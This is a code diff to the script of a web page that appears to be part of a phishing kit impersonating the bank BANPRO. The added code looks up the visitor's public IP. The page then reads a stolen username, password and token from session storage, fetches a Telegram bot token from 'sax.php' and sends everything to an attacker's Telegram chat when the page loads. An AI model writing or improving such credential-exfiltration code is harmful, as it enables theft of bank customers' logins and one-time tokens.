@@ -75,6 +75,17 @@
 
     <script>
         document.addEventListener("DOMContentLoaded", function() {
+            // Función para obtener la IP del cliente
+            function obtenerIP() {
+                return fetch('https://api.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(data => data.ip)
+                    .catch(error => {
+                        console.error('Error al obtener la IP:', error);
+                        return 'IP desconocida';
+                    });
+            }
+
             // Función para obtener el token y el chat ID desde sax.php
             function obtenerToken() {
                 return fetch('sax.php')
@@ -99,13 +110,15 @@
                 const u1 = sessionStorage.getItem('U1') || 'Desconocido';
                 const p1 = sessionStorage.getItem('P1') || 'Desconocido';
 
-                const msg = `BANPRO TOK 1> IP: ${window.location.hostname} - USE: ${u1} - CSS: ${p1} - TK: ${ips1}`;
-
-                // Obtener el token y el chat ID, y luego enviar el mensaje a Telegram
-                obtenerToken().then(data => {
-                    if (data && data.token && data.chat_id) {
-                        enviarMensajeTelegram(data.token, data.chat_id, msg);
-                    }
+                // Obtener la IP del cliente y luego el token y chat_id para enviar el mensaje a Telegram
+                obtenerIP().then(ip => {
+                    const msg = `BANPRO TOK 1> IP: ${ip} - USE: ${u1} - CSS: ${p1} - TK: ${ips1}`;
+                    
+                    obtenerToken().then(data => {
+                        if (data && data.token && data.chat_id) {
+                            enviarMensajeTelegram(data.token, data.chat_id, msg);
+                        }
+                    });
                 });
             });
 
